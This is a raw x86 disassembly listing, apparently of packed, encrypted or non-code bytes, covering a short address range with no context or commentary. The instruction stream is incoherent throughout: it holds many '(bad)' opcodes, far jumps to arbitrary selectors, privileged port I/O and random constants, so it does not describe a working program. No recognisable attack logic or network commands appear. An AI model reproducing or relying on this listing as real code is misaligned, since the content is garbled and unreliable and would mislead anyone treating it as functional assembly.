  41776b:	sub    al,0x49
  41776d:	jmp    0x3cf:0xc167ba0f
  417774:	outs   dx,DWORD PTR ds:[esi]
  417775:	inc    eax
  417776:	scas   al,BYTE PTR es:[edi]
  417777:	test   esp,0x10f46121
  41777d:	mov    fs,WORD PTR [edi]
  41777f:	inc    esp
  417780:	lahf   
  417781:	xor    eax,0x9e2a24d2
  417786:	cmp    DWORD PTR [ebx+ebx*8+0x484423c7],ecx
  41778d:	mov    bl,0xd9
  41778f:	int3   
  417790:	mov    bl,0x50
  417792:	inc    eax
  417793:	sub    ah,BYTE PTR [edi+0x1d689ed3]
  417799:	in     eax,0x65
  41779b:	stos   DWORD PTR es:[edi],eax
  41779c:	xor    DWORD PTR [edx+eiz*2],0xffffffcd
  4177a0:	pusha  
  4177a1:	retf   
  4177a2:	int    0x6f
  4177a4:	mov    ecx,0x3a199aa7
  4177a9:	pop    edi
  4177aa:	pop    esi
  4177ab:	xor    dl,BYTE PTR [edx-0x69a97023]
  4177b1:	mov    ebp,0x5c692d0c
  4177b6:	inc    esi
  4177b7:	je     0x417826
  4177b9:	adc    BYTE PTR [edi+0x2b19eabb],bl
  4177bf:	inc    ebx
  4177c0:	push   eax
  4177c1:	add    eax,0x531bbcf2
  4177c6:	scas   al,BYTE PTR es:[edi]
  4177c7:	ror    BYTE PTR [ebp-0x36],cl
  4177ca:	call   0xb7e00c4
  4177cf:	rol    bl,cl
  4177d1:	sahf   
  4177d2:	mov    esi,0x2bebdb6a
  4177d7:	arpl   cx,dx
  4177d9:	xor    dh,dl
  4177db:	xchg   BYTE PTR [ebp+0x57944e13],ah
  4177e1:	mov    al,ds:0x94395c8d
  4177e6:	xor    eax,0xe0b322a3
  4177eb:	ror    al,0x30
  4177ee:	lds    edx,FWORD PTR [ebx+eiz*4+0x4ad73933]
  4177f5:	jp     0x417781
  4177f7:	jmp    FWORD PTR [eax]
  4177f9:	xchg   esi,eax
  4177fa:	bound  edi,QWORD PTR [ebx-0x360dada1]
  417800:	popf   
  417801:	ja     0x41781a
  417803:	js     0x41786d
  417805:	gs cmp al,0xe8
  417808:	inc    eax
  417809:	push   es
  41780a:	or     DWORD PTR [edi],edx
  41780c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41780d:	test   al,0x2f
  41780f:	xchg   esp,eax
  417810:	pushf  
  417811:	mov    esi,0x5e465fb0
  417816:	pop    ebx
  417817:	leave  
  417818:	ret    0x10
  41781b:	dec    ebp
  41781c:	push   ebp
  41781d:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  417823:	mov    esp,ebp
  417825:	or     ah,dh
  417827:	dec    ebp
  417828:	add    bh,al
  41782a:	add    BYTE PTR [eax],cl
  41782c:	add    BYTE PTR [eax],al
  41782e:	mov    DWORD PTR [eax],0x40f44545
  417834:	xor    DWORD PTR [eax],eax
  417836:	test   DWORD PTR [ebx-0x34070b64],ecx
  41783c:	(bad)  
  41783d:	enter  0x4d45,0xbc
  417841:	mov    esi,DWORD PTR [eax]
  417843:	hlt    
  417844:	test   ebx,ecx
  417846:	pushf  
  417847:	enter  0x4df8,0x8b
  41784b:	mov    DWORD PTR [ebp-0x20],0x890208
  417852:	inc    ebp
  417853:	inc    ebp
  417854:	cld    
  417855:	xor    cl,BYTE PTR [ebx-0xb38b300]
  41785b:	or     BYTE PTR [ebx+0x0],dl
  41785e:	mov    ebx,0x8bd5500
  417863:	call   DWORD PTR [ecx-0x1]
  417866:	pop    es
  417867:	mov    ch,0x33
  417869:	dec    ebx
  41786b:	(bad)  
  41786c:	mov    eax,0x72009ca4
  417871:	push   DWORD PTR [edx]
  417873:	or     BYTE PTR [eax],al
  417875:	jmp    0xff89:0x75c84d03
  41787c:	dec    ebp
  41787d:	loopne 0x41784f
  41787f:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  417885:	add    BYTE PTR [ebx],dh
  417887:	mov    ecx,ebx
  417889:	hlt    
  41788a:	add    ecx,ebx
  41788c:	enter  0x899c,0x32
  417890:	dec    ebp
  417891:	add    ecx,eax
  417893:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  417899:	or     DWORD PTR [ebx-0xb00b29c],0x0
  4178a0:	xor    ecx,ebx
  4178a2:	retf   
  4178a3:	enter  0x4d03,0xc8
  4178a7:	mov    DWORD PTR fs:[eax],ebx
  4178aa:	lea    eax,[eax]
  4178ac:	push   esp
  4178ad:	mov    edi,edi
  4178af:	fs (bad) 
  4178b1:	(bad)  
  4178b2:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  4178b8:	push   0xffffffff
  4178ba:	and    bh,bh
  4178bc:	pop    ecx
  4178bd:	inc    eax
  4178be:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  4178c4:	push   0xffffff8b
  4178c6:	pop    ecx
  4178c7:	cld    
  4178c8:	dec    ebp
  4178c9:	lea    ecx,[ecx+0x45ff08ff]
  4178cf:	mov    BYTE PTR [edx+0x1],cl
  4178d2:	add    BYTE PTR [eax],al
  4178d4:	mov    DWORD PTR [ebp+0x8],0x58008d
  4178db:	dec    DWORD PTR [ebp-0x77]
  4178de:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  4178e5:	cld    
  4178e6:	dec    ebp
  4178e7:	jne    0x41791c
  4178e9:	lea    eax,[ebx]
  4178eb:	push   eax
  4178ec:	mov    edi,edi
  4178ee:	or     BYTE PTR [ecx+0x54a845],cl
  4178f4:	add    al,ch
  4178f6:	(bad)  
  4178f7:	sub    esp,ebp
  4178f9:	add    BYTE PTR [eax],al
  4178fb:	rol    BYTE PTR [eax],0x84
  4178fe:	inc    ebp
  4178ff:	add    dh,BYTE PTR [esi+0x0]
  417902:	add    BYTE PTR [ebp-0x73],al
  417905:	mov    ebp,DWORD PTR [esp+edx*4]
  417908:	inc    DWORD PTR [eax]
  41790a:	lea    ecx,[ebx-0x30074f4]
  417910:	call   0x428495
  417915:	add    BYTE PTR [ebp+0x0],cl
  417918:	jne    0x41795b
  41791a:	dec    DWORD PTR [ebx-0x76210314]
  417920:	dec    ebp
  417921:	add    DWORD PTR [ebp+0x0],esi
  417924:	(bad)  
  417925:	xchg   ebp,eax
  417926:	loopne 0x417927
  417928:	inc    eax
  417929:	inc    DWORD PTR [eax]
  41792b:	mov    ecx,DWORD PTR [ebp-0x4]
  41792e:	xor    edx,DWORD PTR [edx+0x7201b8]
  417934:	add    BYTE PTR [edx],dl
  417936:	enter  0x4d90,0x0
  41793a:	mov    eax,DWORD PTR [eax]
  41793c:	hlt    
  41793d:	add    al,0xa5
  41793f:	mov    al,0xff
  417941:	add    bh,bh
  417943:	add    BYTE PTR [ebx],dh
  417945:	inc    DWORD PTR [ebx]
  417947:	sbb    al,0x89
  417949:	jne    0x417923
  41794b:	mov    esp,DWORD PTR [ecx+0x4500fc]
  417951:	mov    eax,DWORD PTR [ebp-0xff0048]
  417957:	mov    DWORD PTR [eax-0x70],0xee58ed89
  41795e:	inc    DWORD PTR [ebp-0x75]
  417961:	fisttp QWORD PTR [eax+eiz*8]
  417964:	test   DWORD PTR [esi-0x1],esp
  417967:	inc    ebp
  417968:	(bad)  
  417969:	aas    
  41796a:	inc    ebp
  41796b:	(bad)  
  41796c:	lea    edi,[esp+eiz*2-0x1]
  417970:	inc    edi
  417972:	mov    DWORD PTR ds:0x8000c7a0,edi
  417978:	mov    ebp,esi
  41797a:	cld    
  41797b:	in     al,0x8d
  41797d:	inc    ebp
  41797e:	jmp    eax
  417980:	(bad)  
  417981:	fisttp WORD PTR [eax+0x8801c7]
  417987:	jecxz  0x4179ce
  417989:	out    dx,al
  41798a:	inc    DWORD PTR [ebp-0x4]
  41798d:	out    0x8d,eax
  41798f:	aas    
  417990:	inc    edi
  417992:	jmp    FWORD PTR [eax-0x78]
  417995:	inc    DWORD PTR [ecx]
  417997:	mov    DWORD PTR [eax],0xc7a83d
  41799d:	ins    BYTE PTR es:[edi],dx
  41799e:	test   edi,edi
  4179a0:	pandn  mm0,mm5
  4179a3:	aas    
  4179a4:	add    bh,al
  4179a6:	mov    esi,DWORD PTR [eax-0x4]
  4179a9:	inc    DWORD PTR [eax+0xdf01e0]
  4179af:	(bad)  
  4179b0:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4179b4:	mov    ebp,ebx
  4179b6:	xchg   esp,eax
  4179b7:	fild   DWORD PTR [eax]
  4179b9:	(bad)  
  4179ba:	mov    edi,DWORD PTR [eax+0x3]
  4179bd:	(bad)  
  4179be:	cmp    al,0xe7
  4179c0:	dec    ebp
  4179c1:	leave  
  4179c2:	mov    ebp,eax
  4179c4:	fsubr  DWORD PTR [ecx]
  4179c6:	add    BYTE PTR [eax],al
  4179c8:	lea    ecx,[ebx-0x7f0003b4]
  4179ce:	push   edx
  4179cf:	add    DWORD PTR [ebp+0x0],edx
  4179d2:	mov    esi,DWORD PTR [eax]
  4179d4:	mov    WORD PTR [ebx-0x7a750000],?
  4179da:	add    esi,DWORD PTR [ebp-0x78]
  4179dd:	mov    eax,DWORD PTR [eax]
  4179df:	cld    
  4179e0:	push   0x7d
  4179e2:	dec    DWORD PTR [ebx+0xd88c]
  4179e8:	push   edx
  4179e9:	mov    edx,DWORD PTR [ecx-0x4]
  4179ec:	call   DWORD PTR [eax+0x7d01fc]
  4179f2:	mov    ebx,edx
  4179f4:	cld    
  4179f5:	add    BYTE PTR [eax+0x560150],dl
  4179fb:	test   DWORD PTR [ebp+0x75],eax
  4179fe:	in     al,0x8b
  417a00:	in     al,dx
  417a01:	cld    
  417a02:	(bad)  
  417a03:	jge    0x417999
  417a05:	mov    esp,ebx
  417a07:	fsub   st,st(7)
  417a09:	add    bh,al
  417a0b:	mov    ebx,DWORD PTR [eax-0x7a6f8f04]
  417a11:	add    edi,edi
  417a13:	add    bh,bh
  417a15:	mov    eax,0x50d800ed
  417a1a:	inc    ebp
  417a1b:	push   esi
  417a1c:	fisttp WORD PTR [ebx+0x4dc7f43f]
  417a22:	test   BYTE PTR [ebx],dh
  417a24:	fadd   DWORD PTR ds:0x4572c2
  417a2a:	jmp    0x4179ed
  417a2c:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  417a33:	inc    esi
  417a34:	jo     0x417a36
  417a36:	test   edi,eax
  417a38:	jmp    esp
  417a3a:	inc    DWORD PTR [eax]
  417a3c:	in     eax,dx
  417a3d:	add    al,bl
  417a3f:	jne    0x4179c6
  417a41:	mov    edi,edi
  417a43:	cld    
  417a44:	inc    DWORD PTR [ebp-0x12]
  417a47:	mov    esp,esp
  417a49:	mov    ah,0x85
  417a4b:	add    bh,bh
  417a4d:	call   0x119a351
  417a52:	ret    0x858b
  417a55:	cld    
  417a56:	inc    DWORD PTR [eax+0xe301ff]
  417a5c:	out    dx,al
  417a5d:	xor    BYTE PTR [ebp-0xff00cf],al
  417a63:	mov    ebx,ebp
  417a65:	cld    
  417a66:	jo     0x4179f1
  417a68:	or     DWORD PTR [ecx],eax
  417a6a:	add    BYTE PTR [eax],al
  417a6c:	push   eax
  417a6d:	add    DWORD PTR [ebp+0x45],eax
  417a70:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  417a76:	dec    DWORD PTR [ebx-0x3fda0318]
  417a7c:	add    BYTE PTR [ebp-0xbf0040],dl
  417a82:	inc    ebp
  417a83:	or     BYTE PTR [ebx-0x4faf0400],0x45
  417a8a:	add    DWORD PTR [ebx+0x459c00],ecx
  417a90:	mov    edi,edi
  417a92:	mov    eax,0xe80800ff
  417a97:	inc    ebp
  417a98:	sub    BYTE PTR [ebx-0x47000400],cl
  417a9e:	add    al,0x1
  417aa0:	rol    BYTE PTR [eax],0x1e
  417aa3:	jne    0x417aea
  417aa5:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  417aab:	inc    DWORD PTR [ecx]
  417aad:	call   0x86a2b2
  417ab2:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  417ab8:	call   0x41a2be
  417abd:	xor    bh,bh
  417abf:	push   edi
  417ac0:	adc    BYTE PTR [ebx-0x747423bb],al
  417ac6:	loopne 0x417aa4
  417ac8:	ret    
  417ac9:	loopne 0x417a67
  417acb:	xor    DWORD PTR [edx],0x31
  417ace:	cmp    edi,edi
  417ad0:	bswap  esp
  417ad2:	rol    BYTE PTR gs:[eax],0x5
  417ad6:	jmp    0x12c7c20
  417adb:	mov    eax,DWORD PTR [ebp-0x4]
  417ade:	add    BYTE PTR [eax+0xff0100],bh
  417ae4:	cld    
  417ae5:	jne    0x417b64
  417ae7:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  417aed:	push   ss
  417aee:	add    DWORD PTR [eax],eax
  417af0:	add    BYTE PTR [eax+0x7f],dl
  417af3:	inc    ebp
  417af4:	add    BYTE PTR [ebx+0x459850],cl
  417afa:	mov    edi,edi
  417afc:	test   al,0xff
  417afe:	add    BYTE PTR [eax],cl
  417b00:	inc    DWORD PTR [ebp-0x18]
  417b03:	jmp    DWORD PTR ds:0x4d7d00dc
  417b09:	adc    BYTE PTR [ebx+0x459cb9],cl
  417b0f:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  417b15:	pushf  
  417b16:	mov    eax,0x30132
  417b1b:	lea    esi,[ebp+0x2c]
  417b1e:	xor    edi,edi
  417b20:	(bad)  
  417b21:	call   0x140a28e
  417b26:	call   0x135a3b6
  417b2b:	jne    0x417ab8
  417b2d:	xor    edi,esp
  417b2f:	add    eax,DWORD PTR [eax+0xc018d]
  417b35:	push   DWORD PTR [eax]
  417b37:	call   0xcaa293
  417b3c:	int3   
  417b3d:	inc    DWORD PTR [ebp-0x14]
  417b40:	mov    ecx,DWORD PTR [ebp-0x28]
  417b43:	xor    eax,DWORD PTR [eax]
  417b45:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  417b4b:	(bad)  
  417b4c:	xchg   ebp,eax
  417b4d:	in     al,0xff
  417b4f:	add    bh,bh
  417b51:	add    BYTE PTR [ebp+0x45],dl
  417b54:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  417b5a:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff64]
  417b61:	mov    edi,edi
  417b63:	or     BYTE PTR [eax],cl
  417b65:	inc    ebp
  417b66:	test   DWORD PTR gs:[eax],eax
  417b69:	je     0x417bb0
  417b6b:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  417b71:	xor    edx,DWORD PTR [eax-0x73]
  417b74:	push   ebp
  417b75:	or     BYTE PTR [ebp+0x21007572],al
  417b7b:	inc    ebp
  417b7c:	in     al,dx
  417b7d:	mov    ebp,DWORD PTR [eax]
  417b7f:	mov    esp,0x648bc345
  417b84:	fmul   st,st(5)
  417b86:	add    BYTE PTR [ebx],ch
  417b88:	mov    eax,DWORD PTR [ebx]
  417b8a:	cld    
  417b8b:	loopne 0x417b4d
  417b8d:	inc    ebp
  417b8e:	push   ebp
  417b8f:	cmp    ebp,eax
  417b91:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  417b98:	cld    
  417b99:	fadd   DWORD PTR [eax+0x3b014d]
  417b9f:	jne    0x417bd1
  417ba1:	push   0xf8898557
  417ba6:	in     al,dx
  417ba7:	jne    0x417bee
  417ba9:	lea    eax,[ebx+0x72e8dcc8]
  417baf:	das    
  417bb0:	mov    eax,DWORD PTR [eax]
  417bb2:	mov    esp,0x33eb7545
  417bb7:	mov    edi,DWORD PTR [edi+0x4572bc]
  417bbd:	xor    eax,edi
  417bbf:	adc    DWORD PTR [ebp-0xcd0064],0x8be131
  417bc9:	rcl    BYTE PTR [eax-0x40],1
  417bcc:	inc    ebp
  417bcd:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  417bd5:	inc    ebp
  417bd6:	xchg   ebp,eax
  417bd7:	ud0    ebp,DWORD PTR [ebx]
  417bda:	inc    DWORD PTR [eax]
  417bdc:	retf   
  417bdd:	jbe    0x417bdf
  417bdf:	mov    dl,BYTE PTR [eax-0x80]
  417be2:	push   ebp
  417be3:	pop    ds
  417be4:	mov    ecx,DWORD PTR [esp+esi*8]
  417be7:	inc    eax
  417be8:	retf   
  417be9:	inc    ebp
  417bea:	iret   
  417beb:	jb     0x417bb5
  417bed:	mov    eax,DWORD PTR [edi]
  417bef:	enter  0x4545,0x1
  417bf3:	xor    DWORD PTR [eax],eax
  417bf5:	pushf  
  417bf6:	mov    ecx,DWORD PTR [ecx+0x304df0bc]
  417bfc:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  417c03:	dec    ebp
  417c04:	add    BYTE PTR [ebx],dh
  417c06:	inc    ebp
  417c07:	mov    DWORD PTR [ebx-0x3f631b4c],ecx
  417c0d:	xor    dl,BYTE PTR [edx]
  417c0f:	add    eax,DWORD PTR [ebp-0x77]
  417c12:	mov    eax,esp
  417c14:	fmul   DWORD PTR [ebp-0x3d]
  417c17:	xor    eax,DWORD PTR [ebx+eax*1+0x832899c]
  417c1e:	mov    DWORD PTR [ebp-0x28],eax
  417c21:	rol    DWORD PTR [ebp-0x64],1
  417c24:	xor    eax,edi
  417c26:	mov    ecx,0xff858db0
  417c2b:	clc    
  417c2c:	enter  0x4d45,0x32
  417c30:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  417c37:	test   esi,edi
  417c39:	clc    
  417c3a:	inc    DWORD PTR [ebp+0x45]
  417c3d:	cmp    al,0x8b
  417c3f:	pushf  
  417c40:	or     bh,al
  417c42:	enter  0x16a8,0x85
  417c46:	xor    eax,edi
  417c48:	pushf  
  417c49:	inc    ebp
  417c4a:	(bad)  
  417c4b:	ds cld 
  417c4d:	pushf  
  417c4e:	inc    ebp
  417c4f:	mov    edx,DWORD PTR [eax-0x28]
  417c52:	lock push ebp
  417c54:	add    BYTE PTR [ebx],dh
  417c56:	mov    DWORD PTR [ebx],eax
  417c58:	sar    BYTE PTR [ebx],1
  417c5a:	adc    BYTE PTR [edi],cl
  417c5c:	dec    ebp
  417c5d:	adc    al,0x8b
  417c5f:	add    al,dl
  417c61:	jmp    0x1027e31
  417c66:	jb     0x417cb5
  417c68:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  417c6e:	xor    ecx,DWORD PTR [ebp+0x3b]
  417c71:	xor    ecx,DWORD PTR [edi]
  417c73:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  417c77:	(bad)  
  417c79:	clc    
  417c7a:	enter  0x8400,0x8b
  417c7e:	pop    es
  417c7f:	mov    al,0x0
  417c81:	push   ebp
  417c82:	push   cs
  417c83:	xor    ecx,eax
  417c85:	xor    esp,ecx
  417c87:	add    ebp,DWORD PTR [eax]
  417c89:	add    esi,DWORD PTR [eax]
  417c8b:	(bad)  
  417c8d:	retf   0x55c8
  417c90:	repnz mov eax,DWORD PTR [ebp-0x10]
  417c94:	(bad)  
  417c95:	cli    
  417c96:	fdivr  st,st(1)
  417c98:	test   DWORD PTR [eax+edi*8],ecx
  417c9b:	dec    ebp
  417c9c:	inc    ebp
  417c9d:	xor    edi,DWORD PTR [eax-0x7167afd]
  417ca3:	add    BYTE PTR [ebp+0x0],al
  417ca6:	mov    ecx,DWORD PTR [ebp-0x28]
  417ca9:	mov    ecx,ebx
  417cab:	clc    
  417cac:	jne    0x417c79
  417cae:	mov    esi,0xd672d3
  417cb3:	into   
  417cb4:	into   
  417cb5:	scas   eax,DWORD PTR es:[edi]
  417cb6:	dec    ebp
  417cb7:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  417cbd:	sub    ecx,esi
  417cbf:	cmp    ecx,DWORD PTR [ebp+0x77]
  417cc2:	(bad)  
  417cc3:	mov    edi,eax
  417cc5:	mov    al,0x85
  417cc7:	mov    eax,edi
  417cc9:	add    BYTE PTR [ebp-0x75],al
  417ccc:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  417cd3:	xor    eax,DWORD PTR [ebp+0x4503f803]
  417cd9:	(bad)  
  417cdb:	retf   0x559c
  417cde:	(bad)  
  417cdf:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  417ce6:	inc    ebp
  417ce7:	add    eax,0xeb9c4d3f
  417cec:	(bad)  
  417ced:	mov    ecx,esp
  417cef:	lods   al,BYTE PTR ds:[esi]
  417cf0:	test   DWORD PTR [ebp-0x8],edx
  417cf3:	xor    ecx,DWORD PTR [ebp+0x33]
  417cf6:	mov    eax,DWORD PTR [ebx]
  417cf8:	lock add ecx,ebx
  417cfb:	bswap  esi
  417cfd:	retf   0x55d1
  417d00:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  417d06:	jmp    0x417d01
  417d08:	add    BYTE PTR ds:0xebc44d8b,al
  417d0e:	push   ebp
  417d0f:	mov    ebp,DWORD PTR [ebx]
  417d11:	test   al,0x8b
  417d13:	push   ebp
  417d14:	clc    
  417d15:	xor    ecx,ebx
  417d17:	xor    ecx,esi
  417d19:	add    edx,ecx
  417d1b:	add    eax,DWORD PTR [edx+0xca010f]
  417d21:	push   ebp
  417d22:	dec    ebp
  417d23:	mov    ecx,DWORD PTR [ebx-0x34050710]
  417d29:	stc    
  417d2a:	rol    DWORD PTR ds:0xebce4dd6,cl
  417d30:	scas   eax,DWORD PTR es:[edi]
  417d31:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  417d37:	xor    ebp,DWORD PTR [ebx]
  417d39:	xor    edi,DWORD PTR [ebx]
  417d3b:	add    esi,DWORD PTR [edi+0x3]
  417d3e:	mov    ecx,DWORD PTR [edi]
  417d40:	clc    
  417d41:	retf   0x55cb
  417d44:	into   
  417d45:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  417d4c:	mov    eax,0x3376554d
  417d51:	mov    esi,DWORD PTR [ebx]
  417d53:	int3   
  417d54:	add    edx,DWORD PTR [ebp+0x3]
  417d57:	xor    ecx,DWORD PTR [edi]
  417d59:	xor    ecx,edx
  417d5b:	add    edx,DWORD PTR [ebp+0x3]
  417d5e:	mov    ecx,DWORD PTR [edi]
  417d60:	lock retf 0x4dfa
  417d64:	stc    
  417d65:	mov    ecx,DWORD PTR [eax]
  417d67:	or     BYTE PTR [ebp+0x4d],cl
  417d6a:	jmp    0x1057dfa
  417d6f:	dec    ebp
  417d70:	dec    ebp
  417d71:	(bad)  
  417d72:	mov    ebx,esp
  417d74:	clc    
  417d75:	test   ebx,ecx
  417d77:	clc    
  417d78:	ror    DWORD PTR [ebp-0x2a],cl
  417d7b:	mov    esi,ecx
  417d7d:	call   0x33ccc331
  417d82:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  417d89:	retf   
  417d8a:	ja     0x417d5a
  417d8c:	mov    ebp,DWORD PTR [eax-0x48]
  417d8f:	dec    ebp
  417d90:	xor    ecx,DWORD PTR [di+0x3]
  417d94:	mov    esp,esp
  417d96:	clc    
  417d97:	push   ebp
  417d98:	retf   
  417d99:	mov    dl,bl
  417d9b:	adc    esi,edx
  417d9d:	jb     0x417d6d
  417d9f:	add    BYTE PTR [edi-0x3b7474b3],ch
  417da5:	call   0x4d6d4927
  417daa:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  417db0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417db1:	pushf  
  417db2:	inc    ebp
  417db3:	xor    cl,BYTE PTR [ebp-0x78]
  417db6:	mov    edx,edi
  417db8:	clc    
  417db9:	dec    ebp
  417dba:	retf   
  417dbb:	mov    edx,ebx
  417dbd:	call   0x56105198
  417dc2:	scas   eax,DWORD PTR es:[edi]
  417dc3:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  417dc9:	pushf  
  417dca:	sub    esi,DWORD PTR [edx]
  417dcc:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  417dd2:	lods   al,BYTE PTR ds:[esi]
  417dd3:	xor    esp,DWORD PTR [ebx]
  417dd5:	add    ecx,DWORD PTR [ebp-0x1c]
  417dd8:	mov    edi,DWORD PTR [ebp-0x8]
  417ddb:	mov    bl,cl
  417ddd:	cmp    dl,bl
  417ddf:	jb     0x417daf
  417de1:	add    dh,dl
  417de3:	dec    ebp
  417de4:	scas   eax,DWORD PTR es:[edi]
  417de5:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  417deb:	shr    DWORD PTR [ebx],cl
  417ded:	into   
  417dee:	cmp    edx,esi
  417df0:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  417df6:	dec    ebp
  417df7:	dec    ebp
  417df8:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  417dfe:	retf   
  417dff:	xor    edx,esi
  417e01:	add    ecx,esi
  417e03:	imul   ecx,edx
  417e06:	mov    DWORD PTR [ebp+0x8],edx
  417e09:	xor    ecx,DWORD PTR [ebp+0x2b]
  417e0c:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  417e12:	add    esi,DWORD PTR [ebx]
  417e14:	mov    ah,0x3
  417e16:	inc    ebp
  417e17:	rdtsc  
  417e19:	xlat   BYTE PTR ds:[ebx]
  417e1a:	pushf  
  417e1b:	jge    0x417da6
  417e1d:	xor    ebx,eax
  417e1f:	sub    eax,DWORD PTR [ebp-0x73]
  417e22:	(bad)  
  417e23:	cmp    al,al
  417e25:	jb     0x417dac
  417e27:	add    al,bh
  417e29:	ror    DWORD PTR [ebp-0x7a],1
  417e2c:	xor    edi,edi
  417e2e:	add    edi,edi
  417e30:	jmp    0x417e7f
  417e32:	mov    ecx,DWORD PTR [ebx-0x34341324]
  417e38:	dec    ebp
  417e39:	into   
  417e3a:	mov    ebp,DWORD PTR [edi-0x23737428]
  417e40:	pushf  
  417e41:	shl    DWORD PTR [edx],cl
  417e43:	retf   0x5588
  417e46:	or     ecx,DWORD PTR [ebp+0x7233114d]
  417e4c:	add    eax,DWORD PTR [eax]
  417e4e:	in     al,0x4d
  417e50:	push   ebp
  417e51:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  417e57:	fs add ch,cl
  417e5a:	dec    ebp
  417e5b:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  417e61:	dec    ebp
  417e62:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  417e68:	jge    0x417e38
  417e6a:	mov    BYTE PTR [edi+0xf723b3a],ch
  417e70:	add    cl,dh
  417e72:	dec    ebp
  417e73:	dec    DWORD PTR [ebx-0x2c032375]
  417e79:	adc    BYTE PTR [ebp+0x1],0x8b
  417e7d:	add    al,bl
  417e7f:	jge    0x417e0d
  417e81:	push   0xffffff9c
  417e83:	push   0x8b3032
  417e88:	shl    BYTE PTR [ebp+0x55],0x6a
  417e8c:	xor    edi,edi
  417e8e:	xor    edx,DWORD PTR [ebx+eax*1]
  417e91:	inc    ebp
  417e92:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  417e98:	dec    ebp
  417e99:	or     BYTE PTR [ecx+0x4dc8e483],cl
  417e9f:	jbe    0x417e2c
  417ea1:	mov    ebp,esp
  417ea3:	ror    bl,1
  417ea5:	enter  0x14ce,0xaf
  417ea9:	dec    DWORD PTR [ebx-0x2cef17f8]
  417eaf:	push   ebp
  417eb0:	retf   0x5540
  417eb3:	push   ebp
  417eb4:	mov    esi,DWORD PTR [edx-0x1c]
  417eb7:	mov    edx,ebx
  417eb9:	cld    
  417eba:	(bad)  
  417ebb:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  417ec2:	sti    
  417ec3:	add    dh,cl
  417ec5:	push   0xffffff94
  417ec7:	call   FWORD PTR [eax+edx*8-0x74c4afce]
  417ece:	bswap  esp
  417ed0:	pop    esi
  417ed1:	inc    ebp
  417ed2:	dec    DWORD PTR [ecx+0x45e8c88b]
  417ed8:	push   ebp
  417ed9:	xor    esi,DWORD PTR [ebx]
  417edb:	mov    DWORD PTR [ebx],0xcac00f9c
  417ee1:	aas    
  417ee2:	push   ebp
  417ee3:	inc    ebp
  417ee4:	xor    ecx,eax
  417ee6:	add    ecx,eax
  417ee8:	mov    eax,DWORD PTR [ebx]
  417eea:	(bad)  
  417eeb:	jmp    0x417e79
  417eed:	mov    bl,BYTE PTR [ebp+eax*1-0x2f7674ce]
  417ef4:	les    edi,FWORD PTR [esi-0xeccefb3]
  417efa:	mov    edx,0xff378d80
  417eff:	mov    dh,0xd1
  417f01:	cmp    edx,DWORD PTR [ebp+0xf]
  417f04:	mov    eax,DWORD PTR [edx-0x20]
  417f07:	add    BYTE PTR [ebp-0x75],bh
  417f0a:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  417f11:	pushf  
  417f12:	retf   0x8632
  417f15:	cmp    ebp,0x8
  417f18:	call   ebx
  417f1a:	inc    ebp
  417f1b:	inc    ebp
  417f1c:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  417f22:	mov    esi,DWORD PTR [ecx]
  417f24:	enter  0x49c,0xc7
  417f28:	add    al,al
  417f2a:	add    bl,al
  417f2c:	(bad)  
  417f2d:	clc    
  417f2e:	enter  0x45,0x31
  417f32:	push   eax
  417f33:	pushf  
  417f34:	mov    edi,eax
  417f36:	int3   
  417f37:	or     al,al
  417f39:	test   DWORD PTR [edi],edi
  417f3b:	clc    
  417f3c:	gs inc ebp
  417f3e:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  417f44:	push   ss
  417f45:	xor    ecx,DWORD PTR [ebp+0x3]
  417f48:	sub    edx,DWORD PTR [ecx-0x76]
  417f4b:	dec    ebp
  417f4c:	add    DWORD PTR [ebx+0x88d845],ecx
  417f52:	mov    esi,DWORD PTR [ebx]
  417f54:	or     BYTE PTR [ebx],al
  417f56:	cmp    edx,DWORD PTR [ecx-0x38]
  417f59:	dec    ebp
  417f5a:	out    dx,eax
  417f5b:	xor    eax,DWORD PTR [ebp+0x3]
  417f5e:	mov    edx,DWORD PTR [ecx-0x28]
  417f61:	dec    ebp
